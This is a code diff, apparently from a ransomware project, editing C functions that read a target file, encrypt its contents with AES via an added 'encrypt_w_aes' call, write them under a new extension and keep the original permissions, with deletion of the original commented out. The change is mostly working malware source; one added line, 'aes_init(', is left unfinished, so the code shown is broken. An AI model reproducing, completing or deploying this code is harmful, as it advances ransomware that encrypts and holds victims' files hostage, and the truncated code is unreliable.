@@ -28,18 +28,18 @@ size_t read_file(const char *filepath, ransom_t *ransom, char *(*fxn)(char *, ra
 		fprintf(stderr, "File is empty\n");
 		return(0);
 	}
-	fd = fopen(filepath, "rb");
-	fseek(fd, file_offset, SEEK_SET);
+	if ((fd = fopen(filepath, "rb")))
+		fseek(fd, file_offset, SEEK_SET);
+	else
+		return(0);
 #ifndef NO_DEBUG
 	printf("\n\n----------------------------------------------\n");
 	printf("st_size: %d - file_offset: %d == %d\n", (int)file_info.st_size, (int)ransom->target_file_buf->file_offset, (int)file_info.st_size - (int)ransom->target_file_buf->file_offset);
 	printf("bytes_read: %d\n", (int)bytes_read);
 	getchar();
 #endif
-	if ((int)file_info.st_size - (int)file_offset > BIGBUF)
-	{
+	if (((int)file_info.st_size - (int)file_offset) > BIGBUF)
 		bytes_read = BIGBUF;
-	}
 	else
 		bytes_read = (size_t)file_info.st_size - file_offset;
 	fread((char *)ransom->target_file_buf->buf, bytes_read, sizeof(char), fd);
@@ -48,7 +48,6 @@ size_t read_file(const char *filepath, ransom_t *ransom, char *(*fxn)(char *, ra
 	unlink(filepath);
 	*/
 	/* update tmp buffer struct to use in main. */
-	/* TODO: Have an off by 1 bug here. */
 	ransom->target_file_buf->buf[bytes_read] = '\0';
 	ransom->target_file_buf->file_offset += bytes_read;
 	ransom->target_file_buf->bytes_read = bytes_read;
@@ -87,18 +86,17 @@ char *write_file(char *buffer, ransom_t *ransom)
 	if (find_substr_end(filepath, new_ext) == 0)
 		my_strncat(filepath, new_ext, filepath_len, new_ext_len);
 
-	fd = fopen(filepath, "ab+");
-	fseek(fd, ransom->target_file_buf->file_offset, SEEK_SET);
-/* TODO: base64encode function causes massive memory leaks */
-	/*
-	encrypt_buf = base64encode((const void *)buffer, buf_size + 1);
-	*/
-	encrypt_buf = buffer;
+	if ((fd = fopen(filepath, "ab+")))
+		fseek(fd, ransom->target_file_buf->file_offset, SEEK_SET);
+	else
+		return(NULL);
+	/** ENCRYPT **/
+	aes_init(
+	encrypt_buf = encrypt_w_aes(buffer, buf_size);
 	if ((bytes_written = fwrite(encrypt_buf, buf_size, sizeof(char), fd)) < 1)
 		fprintf(stderr, "No bytes written\n");
-	/*
 	free(encrypt_buf);
-	*/
+
 	fclose(fd);
 	chmod(filepath, ransom->target_file_buf->file_info.st_mode);
 	return(buffer);
